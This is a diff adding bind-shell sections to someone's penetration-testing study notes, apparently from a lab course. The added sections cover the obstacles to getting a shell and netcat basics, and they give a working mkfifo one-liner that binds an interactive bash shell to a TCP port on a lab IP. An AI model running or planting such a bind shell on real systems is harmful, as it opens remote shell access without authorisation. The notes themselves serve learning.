@@ -16,6 +16,8 @@ A **shell** provides a command-line interface (CLI) to interact with the system 
 - **Payload**: Code designed to exploit a system vulnerability, often leading to remote shell access.
 
 # Shell Basics
+
+## Anatomy of a Shell
 Every operating system has a shell, and to interact with it, we must use an application known as a terminal emulator. 
 
 ### Command Language Interpreters:
@@ -46,3 +48,47 @@ __Shell Validation Using 'env'__
 ```
 env
 ```
+
+## Bind Shells
+we will be looking to use the terminal emulator application on our local attack box to control the remote system through its shell. This is typically done by using a Bind shell or reverse shell
+![image](https://github.com/user-attachments/assets/a238083c-1244-447c-9a1b-dd5f8ead06f0)
+
+### Challenges in Getting a Shell:
+
+1. **Listener Needed**: There must be a listener running on the target.
+2. **Starting a Listener**: If no listener is active, you need to start one.
+3. **Firewall and NAT/PAT**: 
+   - Strict incoming firewall rules and NAT/PAT on the network edge can block external connections.
+   - You typically need to be on the internal network to bypass these rules.
+4. **OS Firewalls**: 
+   - Windows and Linux firewalls often block incoming connections not associated with trusted applications.
+
+### Example bind shell implementation 
+Netcat (nc) is considered our Swiss-Army Knife since it can function over TCP, UDP, and Unix sockets. It's capable of using IPv4 & IPv6, opening and listening on sockets, operating as a proxy, and even dealing with text input and output. 
+
+__No. 1: Server - Target starting Netcat listener__
+```
+Target@server:~$ nc -lvnp 7777
+```
+__No. 2: Client - Attack box connecting to target__
+```
+nc -nv 10.129.41.200 7777
+```
+once connected you will see succeeded output on attackbox and connection recieved on target. you can send messages by simply typing into the attack box terminal. We still havent got shell its just a tcp connection.
+
+### Establishing a Basic Bind Shell with Netcat
+we will need to specify the directory, shell, listener, work with some pipelines, and input & output redirection to ensure a shell to the system gets served when the client attempts to connect.
+
+__No. 1: Server - Binding a Bash shell to the TCP session__
+```
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
+```
+this is a payload.
+
+__No. 2: Client - Connecting to bind shell on target__
+```
+nc -nv 10.129.41.200 7777
+```
+you will notice $ means shell. The exercises helped us understand how a bind shell works without security controls like NAT, firewalls, IDS/IPS, or authentication mechanisms (unrealistic scenario).
+
+
